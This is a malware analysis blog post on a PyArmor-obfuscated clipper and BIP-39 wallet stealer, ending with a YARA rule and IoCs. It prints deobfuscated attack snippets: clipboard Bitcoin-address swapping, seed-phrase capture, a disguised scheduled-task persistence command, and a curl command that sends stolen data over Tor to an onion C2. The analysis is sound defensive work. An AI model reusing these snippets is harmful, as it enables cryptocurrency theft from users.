@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=47529b63c378406690e9f677e751d5835b234a29">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Deconstructing a PyArmor-Obfuscated Clipper and Wallet Stealer | RE Reports</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Deconstructing a PyArmor-Obfuscated Clipper and Wallet Stealer" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Author: Manohar Gonohal Date: July 26, 2026 Target File: bed759e549a932e839a6fc57ae831105cc17bdd8ec86b5ba54d018f92f5d9795.exe Threat Classification: Clipper &amp; Cryptocurrency Wallet Stealer" />
+<meta property="og:description" content="Author: Manohar Gonohal Date: July 26, 2026 Target File: bed759e549a932e839a6fc57ae831105cc17bdd8ec86b5ba54d018f92f5d9795.exe Threat Classification: Clipper &amp; Cryptocurrency Wallet Stealer" />
+<link rel="canonical" href="http://localhost:4000/Deconstructing-a-PyArmor-Obfuscated-Clipper-and-Wallet-Stealer/" />
+<meta property="og:url" content="http://localhost:4000/Deconstructing-a-PyArmor-Obfuscated-Clipper-and-Wallet-Stealer/" />
+<meta property="og:site_name" content="RE Reports" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Deconstructing a PyArmor-Obfuscated Clipper and Wallet Stealer" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Author: Manohar Gonohal Date: July 26, 2026 Target File: bed759e549a932e839a6fc57ae831105cc17bdd8ec86b5ba54d018f92f5d9795.exe Threat Classification: Clipper &amp; Cryptocurrency Wallet Stealer","headline":"Deconstructing a PyArmor-Obfuscated Clipper and Wallet Stealer","url":"http://localhost:4000/Deconstructing-a-PyArmor-Obfuscated-Clipper-and-Wallet-Stealer/"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>RE Reports</h1>
+        </a>
+        <h2>Technical analysis, threat intelligence reports, and malware reverse engineering write-ups.</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/ManuMW/RE-Reports" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <ul>
+  <li><strong>Author:</strong> Manohar Gonohal</li>
+  <li><strong>Date:</strong> July 26, 2026</li>
+  <li><strong>Target File:</strong> <code class="language-plaintext highlighter-rouge">bed759e549a932e839a6fc57ae831105cc17bdd8ec86b5ba54d018f92f5d9795.exe</code></li>
+  <li><strong>Threat Classification:</strong> Clipper &amp; Cryptocurrency Wallet Stealer</li>
+</ul>
+
+<hr />
+<h2 id="executive-summary">Executive Summary</h2>
+<p>Hey there! I’m documenting my end-to-end reverse engineering journey of a pretty sneaky, highly obfuscated executable. Initial triaging indicated a PyInstaller-packaged loader. Deep static and dynamic analysis revealed multiple anti-analysis protections, custom dynamic API loading, PyArmor obfuscation, and a resource payload encrypted with a 12-byte repeating XOR key.</p>
+
+<p>Once decrypted, the true payload was identified: a WSH (Windows Script Host) based cryptocurrency clipper that monitors clipboards for BIP-39 seed phrases (<a href="https://www.reddit.com/r/Bitcoin/comments/1598e7e/what_is_a_bip39_seed_phrase_a_few_tips_for/">What is a BIP-39 seed phrase – a few tips for handling your seed words safely : r/Bitcoin</a>) and redirects BTC transactions to attacker-controlled wallets.</p>
+
+<hr />
+
+<h2 id="phase-1-static-pe--ghidra-analysis">Phase 1: Static PE &amp; Ghidra Analysis</h2>
+
+<h3 id="11-anti-analysis--debugger-detection">1.1 Anti-Analysis &amp; Debugger Detection</h3>
+<p>When I first imported the executable into Ghidra, I noticed right away that the author included several classic anti-analysis and anti-debugging tricks to trip up analysts and automated sandboxes:</p>
+
+<ul>
+  <li><strong>Invalid <code class="language-plaintext highlighter-rouge">CloseHandle</code> Traps:</strong> The binary deliberately calls <code class="language-plaintext highlighter-rouge">CloseHandle</code> on invalid handle values inside functions like <code class="language-plaintext highlighter-rouge">ProcessPyInstallerChild</code>. On a regular system, this fails quietly; under a debugger, it triggers a <code class="language-plaintext highlighter-rouge">STATUS_INVALID_HANDLE</code> exception to crash the debugging session.</li>
+  <li><strong>Timing Checks:</strong> I found calls to <code class="language-plaintext highlighter-rouge">QueryPerformanceCounter</code> and <code class="language-plaintext highlighter-rouge">GetSystemTimeAsFileTime</code> wrapped around key code blocks to measure execution delays and detect if someone is single-stepping through code.</li>
+  <li><strong>Fast Fail Protections:</strong> Hardcoded checks like <code class="language-plaintext highlighter-rouge">IsDebuggerPresent</code> coupled with <code class="language-plaintext highlighter-rouge">SetUnhandledExceptionFilter(0)</code> ensure that if an exception occurs under analysis, the process instantly terminates.</li>
+</ul>
+
+<p>Here is the decompiled snippet I pulled from Ghidra showing this exact exception filter and debugger check combo:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">HandleSecurityFailure</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param_1</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// ... [context capture and stack unwinding] ...</span>
+  
+  <span class="n">BVar2</span> <span class="o">=</span> <span class="n">IsDebuggerPresent</span><span class="p">();</span>
+  <span class="n">SetUnhandledExceptionFilter</span><span class="p">((</span><span class="n">LPTOP_LEVEL_EXCEPTION_FILTER</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+  <span class="n">LVar3</span> <span class="o">=</span> <span class="n">UnhandledExceptionFilter</span><span class="p">((</span><span class="n">_EXCEPTION_POINTERS</span> <span class="o">*</span><span class="p">)(</span><span class="n">puVar4</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">));</span>
+  
+  <span class="k">if</span> <span class="p">((</span><span class="n">LVar3</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">BVar2</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">FUN_14000e344</span><span class="p">();</span> <span class="c1">// Fast Fail execution</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="12-dynamic-api-resolving">1.2 Dynamic API Resolving</h3>
+<p>To keep import scanners in the dark, the malware hides its sensitive Windows API calls instead of putting them in the Import Address Table (IAT). I reversed two key dynamic API resolution routines:</p>
+
+<ul>
+  <li><strong><code class="language-plaintext highlighter-rouge">ResolveDynamicApiWithProtection</code> (formerly <code class="language-plaintext highlighter-rouge">FUN_14002105c</code>):</strong> Dynamically resolves functions using <code class="language-plaintext highlighter-rouge">LoadLibraryExW</code> and <code class="language-plaintext highlighter-rouge">GetProcAddress</code>, while tweaking memory page permissions with <code class="language-plaintext highlighter-rouge">VirtualProtect</code>.</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">ResolveDynamicApiStandard</code> (formerly <code class="language-plaintext highlighter-rouge">FUN_14000f178</code>):</strong> Handles internal caching of resolved DLL pointers.</li>
+</ul>
+
+<h3 id="13-identifying-the-pyinstaller-bootloader">1.3 Identifying the PyInstaller Bootloader</h3>
+<p>After tracing the core execution loop, I renamed the main function to <code class="language-plaintext highlighter-rouge">ProcessPyInstallerChild</code> (formerly <code class="language-plaintext highlighter-rouge">FUN_14000a000</code>). It registers a window class called <code class="language-plaintext highlighter-rouge">PyInstallerOnefileHiddenWindow</code> and spawns a hidden window <code class="language-plaintext highlighter-rouge">PyInstaller Onefile Hidden Window</code> to manage child processes extracted to disk.</p>
+
+<hr />
+
+<h2 id="phase-2-extracting-the-pyinstaller-archive">Phase 2: Extracting the PyInstaller Archive</h2>
+
+<p>Knowing I was dealing with a PyInstaller bundle, I ran <code class="language-plaintext highlighter-rouge">pyinstxtractor.py</code> to unpack the file structure:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python</span><span class="w"> </span><span class="nx">pyinstxtractor.py</span><span class="w"> </span><span class="nx">bed759e549a932e839a6fc57ae831105cc17bdd8ec86b5ba54d018f92f5d9795.exe</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The tool successfully extracted the inner archive, giving me access to compiled Python bytecode files (<code class="language-plaintext highlighter-rouge">.pyc</code>), internal dependencies, and an extracted payload directory.</p>
+
+<p>Looking closely at <code class="language-plaintext highlighter-rouge">installer.pyc</code>, I noticed the magic header bytes <code class="language-plaintext highlighter-rouge">PY000000</code>. This told me the primary Python script was packed with <strong>PyArmor</strong> obfuscation, preventing simple Python bytecode decompilation right off the bat.</p>
+
+<hr />
+
+<h2 id="phase-3-cryptanalysis--payload-decryption">Phase 3: Cryptanalysis &amp; Payload Decryption</h2>
+
+<p>Once <code class="language-plaintext highlighter-rouge">pyinstxtractor</code> finished dumping the archive contents, I immediately noticed an interesting subfolder named <code class="language-plaintext highlighter-rouge">data_p002</code>. Inside, there were several files with gibberish headers. For instance, <code class="language-plaintext highlighter-rouge">uusd.exe</code> didn’t start with the standard <code class="language-plaintext highlighter-rouge">MZ</code> header at all—it started with <code class="language-plaintext highlighter-rouge">!cMy...</code>.</p>
+
+<h3 id="31-breaking-the-12-byte-xor-encryption">3.1 Breaking the 12-Byte XOR Encryption</h3>
+<p>Looking at the raw hex of <code class="language-plaintext highlighter-rouge">uusd.exe</code>, I spotted a repeating 12-byte hex pattern:
+<code class="language-plaintext highlighter-rouge">6c 39 35 79 5a 58 42 73 4f 50 59 76</code></p>
+
+<p>Since Windows PE files are packed with big chunks of null bytes (<code class="language-plaintext highlighter-rouge">0x00</code>), XORing null bytes with an encryption key conveniently leaks the key itself! I wrote a quick Python script to test XORing the encrypted header against this key, and sure enough, out popped the standard <code class="language-plaintext highlighter-rouge">MZ</code> header and the classic DOS message <code class="language-plaintext highlighter-rouge">"This program cannot be run in DOS mode."</code></p>
+
+<p><strong>Encrypted File Stream (<code class="language-plaintext highlighter-rouge">uusd.exe</code>):</strong></p>
+<pre><code class="language-hex">00000000  21 63 4d 79 5b 58 42 73  4b 50 59 76 6c 39 35 79  |!cMy[XBsKPYvl95y|
+00000010  5a 58 42 73 4f 50 59 76  2c 39 35 79 5a 58 42 73  |ZXBsOPYv,95yZXBs|
+</code></pre>
+
+<p><strong>Decrypted File Stream (<code class="language-plaintext highlighter-rouge">uusd.exe</code>):</strong></p>
+<pre><code class="language-hex">00000000  4d 5a 78 00 01 00 00 00  04 00 00 00 00 00 00 00  |MZx.............|
+00000010  00 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00  |........@.......|
+</code></pre>
+
+<p>Using this XOR key (<code class="language-plaintext highlighter-rouge">6c 39 35 79 5a 58 42 73 4f 50 59 76</code>), I decrypted every file inside <code class="language-plaintext highlighter-rouge">data_p002</code>.</p>
+
+<hr />
+
+<h2 id="phase-4-javascript-deobfuscation-with-webcrack--c2-reversing">Phase 4: JavaScript Deobfuscation with Webcrack &amp; C2 Reversing</h2>
+
+<p>After running the XOR decryption on the <code class="language-plaintext highlighter-rouge">data_p002</code> folder, I ended up with several obfuscated JavaScript files like <code class="language-plaintext highlighter-rouge">002_n.js</code>, <code class="language-plaintext highlighter-rouge">002_b.js</code>, and <code class="language-plaintext highlighter-rouge">pack.js</code>.</p>
+
+<p>To clean up the heavy JavaScript obfuscation (string array rotations and evaluation wrappers), I used <strong>webcrack</strong> to deobfuscate the scripts into readable code.</p>
+
+<h3 id="41-deobfuscated-javascript-code--malicious-capabilities">4.1 Deobfuscated JavaScript Code &amp; Malicious Capabilities</h3>
+
+<p>Once webcrack processed the JavaScript files, the full malicious functionality was laid bare:</p>
+
+<h4 id="a-clipboard-monitoring--bitcoin-address-swapping">A. Clipboard Monitoring &amp; Bitcoin Address Swapping</h4>
+<p>The script uses <code class="language-plaintext highlighter-rouge">htmlfile</code> / <code class="language-plaintext highlighter-rouge">parentWindow.clipboardData</code> to continuously read clipboard contents. When it detects a Bitcoin address format (e.g., matching <code class="language-plaintext highlighter-rouge">1...</code> or <code class="language-plaintext highlighter-rouge">bc1...</code>), it replaces it with a matching wallet address from <code class="language-plaintext highlighter-rouge">002a.txt</code> (a 1.5 MB list of pre-generated attacker addresses):</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Deobfuscated snippet from 002_n.js</span>
+<span class="kd">var</span> <span class="nx">clipboardText</span> <span class="o">=</span> <span class="nx">htmlDocument</span><span class="p">.</span><span class="nx">parentWindow</span><span class="p">.</span><span class="nx">clipboardData</span><span class="p">.</span><span class="nx">getData</span><span class="p">(</span><span class="dl">"</span><span class="s2">Text</span><span class="dl">"</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nx">isBtcAddress</span><span class="p">(</span><span class="nx">clipboardText</span><span class="p">))</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">replacementAddress</span> <span class="o">=</span> <span class="nx">getMatchingAttackerAddress</span><span class="p">(</span><span class="nx">clipboardText</span><span class="p">,</span> <span class="dl">"</span><span class="s2">002a.txt</span><span class="dl">"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">replacementAddress</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">htmlDocument</span><span class="p">.</span><span class="nx">parentWindow</span><span class="p">.</span><span class="nx">clipboardData</span><span class="p">.</span><span class="nx">setData</span><span class="p">(</span><span class="dl">"</span><span class="s2">Text</span><span class="dl">"</span><span class="p">,</span> <span class="nx">replacementAddress</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h4 id="b-bip-39-seed-phrase-stealing">B. BIP-39 Seed Phrase Stealing</h4>
+<p>The script compares words copied to the clipboard against <code class="language-plaintext highlighter-rouge">002w.txt</code> (a standard BIP-39 wordlist). If a user copies a 12- or 24-word recovery phrase, the script captures it for exfiltration:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Deobfuscated snippet checking BIP-39 seed words</span>
+<span class="kd">var</span> <span class="nx">words</span> <span class="o">=</span> <span class="nx">clipboardText</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">().</span><span class="nx">split</span><span class="p">(</span><span class="sr">/</span><span class="se">\s</span><span class="sr">+/</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">words</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;=</span> <span class="mi">12</span> <span class="o">&amp;&amp;</span> <span class="nx">words</span><span class="p">.</span><span class="nx">every</span><span class="p">(</span><span class="nx">w</span> <span class="o">=&gt;</span> <span class="nx">bip39Wordlist</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">w</span><span class="p">)))</span> <span class="p">{</span>
+    <span class="nx">exfiltrateSeedPhrase</span><span class="p">(</span><span class="nx">clipboardText</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h4 id="c-persistence-via-scheduled-task-002xml">C. Persistence via Scheduled Task (<code class="language-plaintext highlighter-rouge">002.xml</code>)</h4>
+<p>The script automatically schedules a Windows task using <code class="language-plaintext highlighter-rouge">002.xml</code> to re-execute every minute:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Task creation command built dynamically</span>
+<span class="kd">var</span> <span class="nx">shell</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">WScript.Shell</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">shell</span><span class="p">.</span><span class="nx">Run</span><span class="p">(</span><span class="dl">"</span><span class="s2">schtasks /create /xml </span><span class="se">\"</span><span class="s2">002.xml</span><span class="se">\"</span><span class="s2"> /tn </span><span class="se">\"</span><span class="s2">WindowsUpdateCheck</span><span class="se">\"</span><span class="dl">"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h4 id="d-tor-socks5-proxy-c2-communication">D. Tor SOCKS5 Proxy C2 Communication</h4>
+<p>To send stolen data back anonymously, the script connects via a local Tor SOCKS5 proxy on port 9050:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Tor proxy command construction</span>
+<span class="kd">var</span> <span class="nx">cmd</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">curl --socks5-hostname localhost:9050 -X POST -F </span><span class="se">\"</span><span class="s2">data=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">stolenData</span> <span class="o">+</span> <span class="dl">"</span><span class="se">\"</span><span class="s2"> http://</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">onionHost</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">3ad.onion/route.php</span><span class="dl">"</span><span class="p">;</span>
+<span class="nx">shell</span><span class="p">.</span><span class="nx">Run</span><span class="p">(</span><span class="nx">cmd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h3 id="42-discovered-c2-onion-segments">4.2 Discovered C2 Onion Segments</h3>
+<p>The deobfuscated JavaScript dynamically stitches together onion host strings:</p>
+
+<ul>
+  <li><strong>Group A (<code class="language-plaintext highlighter-rouge">002_b.js</code>):</strong> <code class="language-plaintext highlighter-rouge">hxxp[:]//gfo[hash]3ad[.]onion/route[.]php</code></li>
+  <li><strong>Group B (<code class="language-plaintext highlighter-rouge">002_n.js</code>):</strong> <code class="language-plaintext highlighter-rouge">hxxp[:]//swj[hash]ead[.]onion/route[.]php</code> and <code class="language-plaintext highlighter-rouge">hxxp[:]//hek[hash]yid[.]onion/route[.]php</code></li>
+</ul>
+
+<hr />
+
+<h2 id="phase-5-payload-summary-table">Phase 5: Payload Summary Table</h2>
+
+<p>Here is a quick breakdown of what each file in the decrypted payload directory actually does:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">File Name</th>
+      <th style="text-align: left">Decrypted Type</th>
+      <th style="text-align: left">Purpose / Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left"><strong><code class="language-plaintext highlighter-rouge">uusd.exe</code></strong></td>
+      <td style="text-align: left">Win32 PE Executable (8.9 MB)</td>
+      <td style="text-align: left">Main binary agent loaded and run in the background.</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><strong><code class="language-plaintext highlighter-rouge">002.xml</code></strong></td>
+      <td style="text-align: left">XML Task Schema</td>
+      <td style="text-align: left">Scheduled task configuration designed to run every 1 minute for persistence.</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><strong><code class="language-plaintext highlighter-rouge">002a.txt</code></strong></td>
+      <td style="text-align: left">Text File (1.5 MB)</td>
+      <td style="text-align: left">Dictionary of thousands of Bitcoin P2PKH addresses used for address swapping.</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><strong><code class="language-plaintext highlighter-rouge">002w.txt</code></strong></td>
+      <td style="text-align: left">Text File</td>
+      <td style="text-align: left">Official BIP-39 English wordlist used for detecting copied crypto seed phrases.</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><strong><code class="language-plaintext highlighter-rouge">002_b.js</code> / <code class="language-plaintext highlighter-rouge">002_n.js</code></strong></td>
+      <td style="text-align: left">WSH JavaScript</td>
+      <td style="text-align: left">Main clipper &amp; stealer controllers (deobfuscated via webcrack).</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><strong><code class="language-plaintext highlighter-rouge">pack.js</code></strong></td>
+      <td style="text-align: left">JavaScript</td>
+      <td style="text-align: left">Helper wrapper for script execution.</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="yara-hunting-rule">YARA Hunting Rule</h2>
+
+<p>I created the following YARA rule to hunt for both the encrypted file signatures and the decrypted WSH payloads:</p>
+
+<pre><code class="language-yara">rule Clipper_Campaign_data_p002 {
+    meta:
+        description = "Detects cryptocurrency clippers/stealers matching the data_p002 campaign"
+        author = "Manohar Gonohal"
+        date = "2026-07-26"
+        hash = "bed759e549a932e839a6fc57ae831105cc17bdd8ec86b5ba54d018f92f5d9795"
+
+    strings:
+        // Encrypted PE Header signature (using 12-byte XOR key)
+        $enc_pe_header = { 21 63 4d 79 5b 58 42 73 4b 50 59 76 6c 39 35 79 5a 58 42 73 4f 50 59 76 }
+
+        // Tor C2 components
+        $c2_onion_1 = "3ad.onion" ascii wide
+        $c2_onion_2 = "ead.onion" ascii wide
+        $c2_onion_3 = "yid.onion" ascii wide
+        $c2_route = "route.php" ascii wide
+
+        // Registry &amp; payload file paths
+        $file_indicator_1 = "data_p002" ascii wide
+        $file_indicator_2 = "uusd.exe" ascii wide
+        $file_indicator_3 = "002.xml" ascii wide
+        $file_indicator_4 = "002a.txt" ascii wide
+        
+        // JS WSH Script techniques
+        $js_tech_1 = "ActiveXObject" ascii wide
+        $js_tech_2 = "WScript.Shell" ascii wide
+        $js_tech_3 = "winmgmts:\\x5c" ascii wide
+        $js_tech_4 = "socks5-h" ascii wide
+
+    condition:
+        // Detects either the encrypted uusd.exe header, loader paths, C2 domains, or WSH clipper scripts
+        $enc_pe_header or (any of ($c2_onion_*)) or (2 of ($file_indicator_*)) or (3 of ($js_tech_*))
+}
+</code></pre>
+
+<p>You can view live hunting search results for this rule on Hybrid-Analysis here:<br />
+ <a href="https://hybrid-analysis.com/yara-search/results/48c0acd3222ba153a9c13cf83aed1140b59049b1929018d8a1eef53d330d0d24">Hybrid-Analysis YARA Search Results</a></p>
+
+<hr />
+
+<h2 id="indicators-of-compromise-iocs">Indicators of Compromise (IoCs)</h2>
+<ul>
+  <li><strong>File Hash (Loader):</strong> <code class="language-plaintext highlighter-rouge">bed759e549a932e839a6fc57ae831105cc17bdd8ec86b5ba54d018f92f5d9795</code> (EXE)</li>
+  <li><strong>Encryption Key:</strong> <code class="language-plaintext highlighter-rouge">6c 39 35 79 5a 58 42 73 4f 50 59 76</code> (12-byte XOR)</li>
+  <li><strong>Suspicious Directory:</strong> <code class="language-plaintext highlighter-rouge">data_p002</code></li>
+  <li><strong>Persistence Mechanism:</strong> Windows Scheduled Task running every minute targeting <code class="language-plaintext highlighter-rouge">002_n.js</code> / <code class="language-plaintext highlighter-rouge">uusd.exe</code>.</li>
+</ul>
+
+      </section>
+    </div>
+  </body>
+</html>
